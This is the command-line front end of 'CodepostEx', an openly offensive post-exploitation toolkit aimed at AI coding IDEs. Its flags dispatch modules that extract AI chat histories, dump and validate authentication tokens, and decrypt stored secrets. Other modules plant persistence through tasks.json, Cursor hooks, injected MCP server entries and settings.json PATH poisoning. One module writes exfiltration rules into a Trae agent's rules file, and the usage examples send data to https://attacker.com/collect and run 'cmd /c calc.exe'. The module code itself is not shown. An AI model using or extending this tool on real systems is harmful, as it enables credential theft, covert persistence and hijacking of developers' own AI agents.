using System.CommandLine;
using System.CommandLine.Invocation;
using System.Text;
using CodepostEx;
using CodepostEx.Core;
using CodepostEx.Modules;
using CodepostEx.Services;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;

// ── Arg normalization (PS1-compatible) ─────────────────────────────────────
// -ExtractAIChats  →  --extract-ai-chats   (PascalCase → kebab, single-dash → double-dash)
// -IDE Cursor      →  --ide Cursor
// -h               →  -h                   (single-char flags unchanged)
args = args.Select(NormalizeArg).ToArray();

bool silent  = args.Contains("--silent") || args.Contains("--sl");
bool verbose = args.Contains("--verbose")
    || Environment.GetEnvironmentVariable("CODEPOST_VERBOSE") == "1";

Out.Silent = silent;

// Show custom grouped help before System.CommandLine can show its flat version
if (args.Length == 0)
{
    PrintHelp();
    return 0;
}
if (args.Contains("--help") || args.Contains("-h") || args.Contains("-?"))
{
    PrintHelp();
    return 0;
}
if (args.Contains("--examples"))
{
    PrintExamples();
    return 0;
}
if (args.Contains("--version"))
{
    Console.WriteLine("CodepostEx v0.2");
    return 0;
}

// Validate all --flags before InvokeAsync so System.CommandLine never shows its flat help
var knownOptions = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
{
    // Meta commands (handled before System.CommandLine)
    "--examples",
    // Full names
    "--ide", "--discover", "--current-user", "--workspace-trust-list", "--include-metadata",
    "--extract-ai-chats", "--chats-since", "--html", "--artifacts", "--search",
    "--interesting-files", "--history", "--history-interesting",
    "--dump-token", "--decode-token", "--validate-token",
    "--dump-secrets", "--include-git-secrets",
    "--payload-injected", "--workspace", "--force",
    "--inject-hooks", "--hooks-scope", "--hooks-command", "--hooks-event",
    "--inject-mcp", "--mcp-name", "--mcp-command", "--mcp-scope", "--mcp-ide",
    "--inject-settings", "--settings-method", "--settings-payload", "--settings-scope",
    "--malskill-exfiltration", "--callback-url",
    "--output", "--silent", "--version",
    // Short multi-char aliases (normalized from -xx to --xx)
    "--cu", "--wtl", "--im",
    "--ec", "--cs", "--if", "--hs", "--hi",
    "--dt", "--dc", "--vt",
    "--ds", "--igs",
    "--pi", "--ih", "--hsc", "--hc", "--he",
    "--imcp", "--mn", "--mc", "--ms", "--mi",
    "--iset", "--sm", "--sp", "--ss", "--sl",
    "--mse", "--mse-url",
};
var knownSingleChar = new HashSet<string>(StringComparer.Ordinal)
    { "-h", "-?", "-i", "-d", "-a", "-s", "-w", "-f", "-o" };
foreach (var a in args)
{
    if (a.StartsWith("--"))
    {
        if (!knownOptions.Contains(a))
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.Error.WriteLine($"Unknown option: {a}");
            Console.ResetColor();
            Console.Error.WriteLine();
            PrintHelp();
            return 1;
        }
    }
    else if (a.StartsWith("-") && !knownSingleChar.Contains(a))
    {
        Console.ForegroundColor = ConsoleColor.Red;
        Console.Error.WriteLine($"Unknown option: {a}");
        Console.ResetColor();
        Console.Error.WriteLine();
        PrintHelp();
        return 1;
    }
}

// ── DI ────────────────────────────────────────────────────────────────────
var services = new ServiceCollection();
services.AddSingleton<AppCache>();
services.AddSingleton<PathResolver>();
services.AddSingleton<IdeDiscoveryService>();
services.AddSingleton<VscdbService>();
services.AddSingleton<ProtobufReader>();
services.AddSingleton<ChatExtractor>();
services.AddSingleton<CredentialScanner>();
services.AddSingleton<TokenExtractor>();
services.AddSingleton<SecretExtractor>();
services.AddLogging(b => b.SetMinimumLevel(verbose ? LogLevel.Debug : LogLevel.Warning));
services.AddHttpClient("TokenValidator", c => c.Timeout = TimeSpan.FromSeconds(8));

var sp = services.BuildServiceProvider();
AppDomain.CurrentDomain.ProcessExit += (_, _) => sp.GetRequiredService<AppCache>().Cleanup();

// ── Root command (PS1-style single-command interface) ─────────────────────
var root = new RootCommand("CodepostEx v0.2 — Living of the IDE (Post-exploitation toolkit)") { Name = "CodepostEx" };

// Core targeting
var ideOpt       = new Option<string>("--ide", () => "All",
    "Target IDE: All | Cursor | Windsurf | Kiro | Antigravity");

// Recon
var discoverOpt  = new Option<bool>("--discover",              "Scan for installed AI IDEs");
var userOpt      = new Option<bool>("--current-user",          "Read Cursor account / device info");
var trustOpt     = new Option<bool>("--workspace-trust-list",  "List trusted workspace paths");
var metaOpt      = new Option<bool>("--include-metadata",      "Include workspaceStorage metadata in trust list");

// Chats / history collection
var chatsOpt     = new Option<bool>("--extract-ai-chats",      "Extract AI conversations from .vscdb");
var sinceOpt     = new Option<DateTime?>("--chats-since",      "Only include chats after this date (yyyy-MM-dd)");
var htmlOpt      = new Option<bool>("--html",                  "Generate HTML chat viewer alongside JSON");
var artifactsOpt = new Option<bool>("--artifacts",             "Collect IDE history / settings as a ZIP artifact");
var searchOpt    = new Option<string[]>("--search",
    "Search history for sensitive data: Credentials | Emails (space or comma separated)");
searchOpt.AllowMultipleArgumentsPerToken = true;
var filesOpt     = new Option<bool>("--interesting-files",     "List interesting files found in history");
var historyOpt   = new Option<bool>("--history",               "Collect file-edit history snapshots into ZIP");
var histIntOpt   = new Option<bool>("--history-interesting",   "Scan history entries for sensitive original files");

// Token ops
var tokenOpt     = new Option<bool>("--dump-token",            "Extract IDE authentication tokens");
var decodeOpt    = new Option<bool>("--decode-token",          "Decode JWT claims (implies --dump-token)");
var validateOpt  = new Option<bool>("--validate-token",        "Validate tokens online (implies --dump-token)");

// Secrets
var secretsOpt   = new Option<bool>("--dump-secrets",          "Dump and decrypt extension secrets (DPAPI+AES-GCM)");
var gitSecOpt    = new Option<bool>("--include-git-secrets",   "Include vscode.git git-ipc-auth-token secrets");

// Payload injection
var payloadOpt   = new Option<string?>("--payload-injected",   "Inject persistence payload (e.g. tasks.json)");
var workspaceOpt = new Option<string?>("--workspace",          "Target workspace path (required for --payload-injected)");

// Cursor hooks persistence
var hooksOpt        = new Option<bool>("--inject-hooks",         "Inject Cursor hooks.json persistence payload");
var hooksScopeOpt   = new Option<string>("--hooks-scope",
    () => "user", "Injection scope: user | project | all-users | all  (no admin required for any scope)");
var hooksCommandOpt = new Option<string?>("--hooks-command",     "Command(s) to embed in hooks.json, comma-sep maps positionally to events");
var hooksEventOpt   = new Option<string?>("--hooks-event",       "Hook event(s), comma-sep (default: beforeSubmitPrompt); 'list' shows all events");

// MCP injection
var injectMcpOpt   = new Option<bool>("--inject-mcp",          "Inject MCP server entry into AI IDE mcp.json");
var mcpNameOpt     = new Option<string?>("--mcp-name",         "MCP server name (default: dev-tools)");
var mcpCommandOpt  = new Option<string?>("--mcp-command",      "Command to run as MCP server (e.g. \"cmd /c calc.exe\")");
var mcpScopeOpt    = new Option<string>("--mcp-scope",
    () => "user", "Injection scope: user | project | all (default: user)");
var mcpIdeOpt      = new Option<string>("--mcp-ide",
    () => "Cursor", "Target IDE: Cursor | Windsurf | Kiro | Antigravity | Trae | All (default: Cursor)");

// Settings injection
var injectSetOpt    = new Option<bool>("--inject-settings",    "Inject persistence via VSCode/Cursor settings.json");
var settMethodOpt   = new Option<string>("--settings-method",
    () => "path-poison", "Method: path-poison | shell-args | insecure (default: path-poison)");
var settPayloadOpt  = new Option<string?>("--settings-payload", "Malicious PATH dir or command payload");
var settScopeOpt    = new Option<string>("--settings-scope",
    () => "user", "Injection scope: user | workspace | all (default: user)");

// Malskill exfiltration injection
var malskillOpt     = new Option<bool>("--malskill-exfiltration", "Inject Trae agent exfiltration rules into workspace");
var callbackUrlOpt  = new Option<string?>("--callback-url",        "Callback URL for malskill exfiltration payload");

// Misc
var forceOpt     = new Option<bool>("--force",                 "Force overwrite / re-collect existing output");
var outputOpt    = new Option<string>("--output", () => @".\output", "Output directory for extracted data");
var silentOpt    = new Option<bool>("--silent",                "Suppress all console output");

// Short aliases — single-char bypass normalization, multi-char normalize to --xx
ideOpt.AddAlias("-i");
discoverOpt.AddAlias("-d");
userOpt.AddAlias("--cu");
trustOpt.AddAlias("--wtl");
metaOpt.AddAlias("--im");
chatsOpt.AddAlias("--ec");
sinceOpt.AddAlias("--cs");
artifactsOpt.AddAlias("-a");
searchOpt.AddAlias("-s");
filesOpt.AddAlias("--if");
historyOpt.AddAlias("--hs");
histIntOpt.AddAlias("--hi");
tokenOpt.AddAlias("--dt");
decodeOpt.AddAlias("--dc");
validateOpt.AddAlias("--vt");
secretsOpt.AddAlias("--ds");
gitSecOpt.AddAlias("--igs");
payloadOpt.AddAlias("--pi");
workspaceOpt.AddAlias("-w");
hooksOpt.AddAlias("--ih");
hooksScopeOpt.AddAlias("--hsc");
hooksCommandOpt.AddAlias("--hc");
hooksEventOpt.AddAlias("--he");
injectMcpOpt.AddAlias("--imcp");
mcpNameOpt.AddAlias("--mn");
mcpCommandOpt.AddAlias("--mc");
mcpScopeOpt.AddAlias("--ms");
mcpIdeOpt.AddAlias("--mi");
injectSetOpt.AddAlias("--iset");
settMethodOpt.AddAlias("--sm");
settPayloadOpt.AddAlias("--sp");
settScopeOpt.AddAlias("--ss");
malskillOpt.AddAlias("--mse");
callbackUrlOpt.AddAlias("--mse-url");
forceOpt.AddAlias("-f");
outputOpt.AddAlias("-o");
silentOpt.AddAlias("--sl");

root.AddOption(ideOpt);
root.AddOption(discoverOpt);
root.AddOption(userOpt);
root.AddOption(trustOpt);
root.AddOption(metaOpt);
root.AddOption(chatsOpt);
root.AddOption(sinceOpt);
root.AddOption(htmlOpt);
root.AddOption(artifactsOpt);
root.AddOption(searchOpt);
root.AddOption(filesOpt);
root.AddOption(historyOpt);
root.AddOption(histIntOpt);
root.AddOption(tokenOpt);
root.AddOption(decodeOpt);
root.AddOption(validateOpt);
root.AddOption(secretsOpt);
root.AddOption(gitSecOpt);
root.AddOption(payloadOpt);
root.AddOption(workspaceOpt);
root.AddOption(hooksOpt);
root.AddOption(hooksScopeOpt);
root.AddOption(hooksCommandOpt);
root.AddOption(hooksEventOpt);
root.AddOption(injectMcpOpt);
root.AddOption(mcpNameOpt);
root.AddOption(mcpCommandOpt);
root.AddOption(mcpScopeOpt);
root.AddOption(mcpIdeOpt);
root.AddOption(injectSetOpt);
root.AddOption(settMethodOpt);
root.AddOption(settPayloadOpt);
root.AddOption(settScopeOpt);
root.AddOption(malskillOpt);
root.AddOption(callbackUrlOpt);
root.AddOption(forceOpt);
root.AddOption(outputOpt);
root.AddOption(silentOpt);

root.SetHandler(async (InvocationContext ctx) =>
{
    var ide       = ctx.ParseResult.GetValueForOption(ideOpt)!;
    var discover  = ctx.ParseResult.GetValueForOption(discoverOpt);
    var user      = ctx.ParseResult.GetValueForOption(userOpt);
    var trust     = ctx.ParseResult.GetValueForOption(trustOpt);
    var meta      = ctx.ParseResult.GetValueForOption(metaOpt);
    var chats     = ctx.ParseResult.GetValueForOption(chatsOpt);
    var since     = ctx.ParseResult.GetValueForOption(sinceOpt);
    var html      = ctx.ParseResult.GetValueForOption(htmlOpt);
    var artifacts = ctx.ParseResult.GetValueForOption(artifactsOpt);
    var searchRaw = ctx.ParseResult.GetValueForOption(searchOpt) ?? [];
    var files     = ctx.ParseResult.GetValueForOption(filesOpt);
    var history   = ctx.ParseResult.GetValueForOption(historyOpt);
    var histInt   = ctx.ParseResult.GetValueForOption(histIntOpt);
    var dumpToken = ctx.ParseResult.GetValueForOption(tokenOpt);
    var decode    = ctx.ParseResult.GetValueForOption(decodeOpt);
    var validate  = ctx.ParseResult.GetValueForOption(validateOpt);
    var secrets   = ctx.ParseResult.GetValueForOption(secretsOpt);
    var gitSec    = ctx.ParseResult.GetValueForOption(gitSecOpt);
    var payload      = ctx.ParseResult.GetValueForOption(payloadOpt);
    var workspace    = ctx.ParseResult.GetValueForOption(workspaceOpt);
    var injectHooks  = ctx.ParseResult.GetValueForOption(hooksOpt);
    var hooksScope   = ctx.ParseResult.GetValueForOption(hooksScopeOpt)!;
    var hooksCommand = ctx.ParseResult.GetValueForOption(hooksCommandOpt);
    var hooksEvent   = ctx.ParseResult.GetValueForOption(hooksEventOpt);
    var injectMcp    = ctx.ParseResult.GetValueForOption(injectMcpOpt);
    var mcpName      = ctx.ParseResult.GetValueForOption(mcpNameOpt);
    var mcpCommand   = ctx.ParseResult.GetValueForOption(mcpCommandOpt);
    var mcpScope     = ctx.ParseResult.GetValueForOption(mcpScopeOpt)!;
    var mcpIde       = ctx.ParseResult.GetValueForOption(mcpIdeOpt)!;
    var injectSet    = ctx.ParseResult.GetValueForOption(injectSetOpt);
    var settMethod   = ctx.ParseResult.GetValueForOption(settMethodOpt)!;
    var settPayload  = ctx.ParseResult.GetValueForOption(settPayloadOpt);
    var settScope    = ctx.ParseResult.GetValueForOption(settScopeOpt)!;
    var malskill     = ctx.ParseResult.GetValueForOption(malskillOpt);
    var callbackUrl  = ctx.ParseResult.GetValueForOption(callbackUrlOpt);
    var force        = ctx.ParseResult.GetValueForOption(forceOpt);
    var output       = ctx.ParseResult.GetValueForOption(outputOpt)!;

    // Expand comma-delimited values: "-Search Credentials,Emails" → ["Credentials","Emails"]
    var search = searchRaw
        .SelectMany(s => s.Split(',', StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries))
        .ToArray();

    bool hasAction = discover || user || trust || chats || artifacts || search.Length > 0
        || files || history || histInt
        || dumpToken || decode || validate
        || secrets || gitSec
        || payload is not null || injectHooks || injectMcp || injectSet || malskill;

    if (!hasAction)
    {
        PrintHelp();
        ctx.ExitCode = 0;
        return;
    }

    // ── Dispatch (PS1 priority order) ──────────────────────────────────────

    if (discover)
        DiscoverModule.Run(ide, sp);

    if (trust)
        TrustModule.Run(ide, meta, sp);

    if (payload is not null)
    {
        if (workspace is null)
        {
            Out.Minus("-workspace is required with -payload-injected");
            ctx.ExitCode = 1;
            return;
        }
        InjectModule.Run(ide, workspace, payload, force, sp);
    }

    if (injectHooks)
        HooksModule.Run(hooksScope, workspace, hooksCommand, hooksEvent, force, sp);

    if (injectMcp)
        MCPModule.Run(mcpScope, workspace, mcpIde, mcpName, mcpCommand, force, sp);

    if (injectSet)
        SettingsModule.Run(settScope, workspace, ide, settMethod, settPayload, force, sp);

    if (malskill)
    {
        if (workspace is null)
        {
            Out.Minus("-workspace is required with -malskill-exfiltration");
            ctx.ExitCode = 1;
            return;
        }
        MalskillModule.Run(workspace, callbackUrl ?? "https://callback.example.com", force, output);
    }

    if (dumpToken || decode || validate)
        TokensModule.Run(ide, decode, validate, output, sp);

    if (secrets || gitSec)
        SecretsModule.Run(ide, gitSec, output, sp);

    if (user)
        UserModule.Run(ide, sp);

    if (artifacts)
        ArtifactsModule.Run(ide, output, sp);

    if (chats)
        await ChatsModule.RunAsync(ide, since, html, output, sp);

    if (search.Length > 0)
        SearchModule.Run(ide, search, output, sp);

    if (files)
        FilesModule.Run(ide, sp);

    if (history || histInt)
        HistoryModule.Run(ide, output, histInt, noZip: !history, force, sp);

    ctx.ExitCode = 0;
});

// Pre-parse to catch anything that slips our earlier guard (bare words, wrong value types)
var parseResult = root.Parse(args);
if (parseResult.Errors.Count > 0)
{
    foreach (var e in parseResult.Errors)
        Console.Error.WriteLine($"Error: {e.Message}");
    Console.Error.WriteLine();
    PrintHelp();
    return 1;
}

return await root.InvokeAsync(args);

// ── Local helpers ──────────────────────────────────────────────────────────

static void PrintHelp()
{
    static void Ln() => Console.WriteLine();
    static void Flag(string flag, string desc)
        => Console.WriteLine($"   {flag,-38}{desc}");
    static void Section(string title) { Ln(); Console.WriteLine(title + ":"); }

    PrintBanner();
    Console.WriteLine("  Authorized use: red team / penetration testing with explicit written permission.");
    Ln();
    Console.WriteLine("Usage:  CodepostEx [flags]   |   -examples   usage examples");

    Section("TARGETING");
    Flag("-i, -ide string",                   "target IDE: All|Cursor|Windsurf|Kiro|Trae|Antigravity (default: All)");

    Section("RECON");
    Flag("-d, -discover",                     "detect installed AI IDEs and report paths");
    Flag("-cu, -current-user",                "read account / device info for each IDE");
    Flag("-wtl, -workspace-trust-list",       "enumerate trusted workspace paths");
    Flag("-im, -include-metadata",            "include workspaceStorage metadata in trust list");

    Section("DATA COLLECTION");
    Flag("-ec, -extract-ai-chats",            "extract AI conversations");
    Flag("-cs, -chats-since string",          "filter chats to after date (yyyy-MM-dd)");
    Flag("-a, -artifacts",                    "collect IDE history and settings into ZIP");
    Flag("-s, -search string",                "search: Credentials, Emails, or free-text (comma/space sep)");
    Flag("-if, -interesting-files",           "list sensitive files found in history");
    Flag("-hs, -history",                     "collect file-edit history snapshots into ZIP");
    Flag("-hi, -history-interesting",         "scan history for sensitive original file paths");

    Section("TOKENS");
    Flag("-dt, -dump-token",                  "extract IDE auth tokens from globalStorage");
    Flag("-dc, -decode-token",                "decode JWT claims (implies -dump-token)");
    Flag("-vt, -validate-token",              "validate tokens online (implies -dump-token)");

    Section("SECRETS");
    Flag("-ds, -dump-secrets",                "decrypt extension secrets (DPAPI + AES-GCM)");
    Flag("-igs, -include-git-secrets",        "include vscode.git git-ipc-auth-token entries");

    Section("PERSISTENCE — TASKS");
    Flag("-pi, -payload-injected string",     "inject tasks.json payload into .vscode/");
    Flag("-w, -workspace string",             "target workspace path (required for project scope)");
    Flag("-f, -force",                        "force overwrite / merge into existing file");

    Section("PERSISTENCE — HOOKS (Cursor)");
    Flag("-ih, -inject-hooks",                "inject hooks.json persistence payload");
    Flag("-hsc, -hooks-scope string",         "scope: user|project|all-users|all (default: user)");
    Flag("-hc, -hooks-command string",        "command(s); comma-sep maps one command per event");
    Flag("-he, -hooks-event string",          "event(s); comma-sep (default: beforeSubmitPrompt)");

    Section("PERSISTENCE — MCP SERVER");
    Flag("-imcp, -inject-mcp",                "inject MCP server into mcp.json");
    Flag("-mi, -mcp-ide string",              "target IDE: Cursor|Windsurf|Kiro|Antigravity|Trae|All");
    Flag("-mn, -mcp-name string",             "server key name in mcpServers (default: dev-tools)");
    Flag("-mc, -mcp-command string",          "command to run as MCP server");
    Flag("-ms, -mcp-scope string",            "scope: user|project|all (default: user)");

    Section("PERSISTENCE — SETTINGS");
    Flag("-iset, -inject-settings",           "inject via settings.json");
    Flag("-sm, -settings-method string",      "method: path-poison|shell-args|insecure (default: path-poison)");
    Flag("-sp, -settings-payload string",     "PATH directory (path-poison) or command (shell-args)");
    Flag("-ss, -settings-scope string",       "scope: user|workspace|all (default: user)");

    Section("PERSISTENCE — AGENT RULES (Trae)");
    Flag("-mse, -malskill-exfiltration",      "inject agent exfiltration rules into .trae/rules/project_rules.md");
    Flag("-mse-url, -callback-url string",    "exfiltration callback URL (embedded in rules payload)");

    Section("OUTPUT");
    Flag("-html",                             "generate HTML viewer alongside chat JSON");
    Flag("-o, -output string",               @"output directory (default: .\output)");
    Flag("-sl, -silent",                      "suppress all console output");
    Flag("-h, -help",                         "show this help");
    Flag("-examples",                         "show usage examples");
    Flag("-version",                          "show version");
    Ln();
}

static void PrintExamples()
{
    static void Ex(string desc, string cmd) { Console.WriteLine(desc + ":"); Console.WriteLine("   CodepostEx " + cmd); Console.WriteLine(); }
    static void Section(string title) { Console.WriteLine(title + ":"); Console.WriteLine(); }

    Console.WriteLine();
    Console.WriteLine("EXAMPLES  (CodepostEx -help for flag reference)");
    Console.WriteLine();

    Section("RECON");
    Ex("Detect installed AI IDEs",
       "-discover");
    Ex("Read account / device info for all IDEs",
       "-current-user");
    Ex("List trusted workspace paths",
       "-workspace-trust-list");
    Ex("List trusted workspaces with storage metadata",
       "-workspace-trust-list -include-metadata");

    Section("DATA COLLECTION");
    Ex("Extract AI chats",
       "-extract-ai-chats");
    Ex("Extract AI chats and generate HTML viewer",
       "-extract-ai-chats -html");
    Ex("Extract AI chats filtered by date",
       "-extract-ai-chats -chats-since 2026-01-01");
    Ex("Collect IDE history and settings into ZIP",
       "-artifacts");
    Ex("Search chats for credentials",
       "-search Credentials");
    Ex("Search chats for email addresses",
       "-search Emails");
    Ex("Free-text search across IDE history",
       "-search openai");
    Ex("List sensitive files found in history",
       "-interesting-files");
    Ex("Collect file-edit history snapshots into ZIP",
       "-history");
    Ex("Scan history for sensitive original file paths",
       "-history-interesting");

    Section("TOKENS");
    Ex("Dump auth tokens",
       "-dump-token");
    Ex("Dump and decode JWT token claims",
       "-decode-token");
    Ex("Dump, decode, and validate tokens online",
       "-validate-token");

    Section("SECRETS");
    Ex("Decrypt extension secrets (DPAPI + AES-GCM)",
       "-dump-secrets");
    Ex("Include vscode.git auth tokens in secrets dump",
       "-dump-secrets -include-git-secrets");

    Section("PERSISTENCE — TASKS");
    Ex("Inject tasks.json payload into workspace",
       "-payload-injected tasks.json -workspace C:\\project");
    Ex("Force-overwrite existing tasks.json",
       "-payload-injected tasks.json -workspace C:\\project -force");

    Section("PERSISTENCE — HOOKS (Cursor)");
    Ex("Inject hooks at user scope (default)",
       "-inject-hooks -hooks-command \"cmd /c calc.exe\"");
    Ex("Inject hooks at project scope",
       "-inject-hooks -hooks-scope project -workspace C:\\project -hooks-command \"cmd /c calc.exe\"");
    Ex("Inject hooks on a specific event",
       "-inject-hooks -hooks-event sessionStart -hooks-command \"cmd /c calc.exe\"");

    Section("PERSISTENCE — MCP SERVER");
    Ex("Inject MCP server at user scope",
       "-inject-mcp -mcp-name dev-tools -mcp-command \"cmd /c calc.exe\"");
    Ex("Inject MCP server at project scope",
       "-inject-mcp -mcp-scope project -workspace C:\\project -mcp-name dev-tools -mcp-command \"cmd /c calc.exe\"");
    Ex("Inject MCP server into all IDEs",
       "-inject-mcp -mcp-ide All -mcp-name dev-tools -mcp-command \"cmd /c calc.exe\"");

    Section("PERSISTENCE — SETTINGS");
    Ex("PATH-poisoning at user scope",
       "-inject-settings -settings-payload C:\\loot");
    Ex("Shell-args execution at workspace scope",
       "-inject-settings -settings-method shell-args -settings-scope workspace -workspace C:\\project -settings-payload \"cmd /c calc.exe\"");
    Ex("Bulk insecure settings (61 keys, all IDEs)",
       "-inject-settings -settings-method insecure");

    Section("PERSISTENCE — AGENT RULES (Trae)");
    Ex("Inject Trae exfiltration rules",
       "-malskill-exfiltration -callback-url https://attacker.com/collect -workspace C:\\project");
    Ex("Force-overwrite existing rules file",
       "-malskill-exfiltration -callback-url https://attacker.com/collect -workspace C:\\project -force");

    Section("TARGETING");
    Ex("Target a specific IDE",
       "-ide Cursor -discover");
    Ex("Set a custom output directory",
       "-extract-ai-chats -output C:\\loot");
}

static void PrintBanner()
{
    Console.WriteLine(@"  ___         _                  _   ___     ");
    Console.WriteLine(@" / __|___  __| |___ _ __  ___ __| |_| __|_ __");
    Console.WriteLine(@"| (__/ _ \/ _` / -_) '_ \/ _ (_-<  _| _|\ \ /");
    Console.WriteLine(@" \___\___/\__,_\___| .__/\___/__/\__|___/_\_\   v0.2");
    Console.WriteLine(@"                   |_|");
    Console.WriteLine();
    Console.WriteLine("             Living of the AI IDE (Post Exploitation)");
    Console.WriteLine();
}

static string NormalizeArg(string a)
{
    if (a.Length <= 2 || a[0] != '-' || a[1] == '-' || !char.IsLetter(a[1]))
        return a;
    return "--" + PascalToKebab(a[1..]);
}

static string PascalToKebab(string s)
{
    var sb = new StringBuilder(s.Length + 4);
    for (int i = 0; i < s.Length; i++)
    {
        char c = s[i];
        if (i > 0 && char.IsUpper(c))
        {
            bool prevUpper = char.IsUpper(s[i - 1]);
            bool nextLower = i + 1 < s.Length && char.IsLower(s[i + 1]);
            if (!prevUpper || nextLower)
                sb.Append('-');
        }
        sb.Append(char.ToLowerInvariant(c));
    }
    return sb.ToString();
}
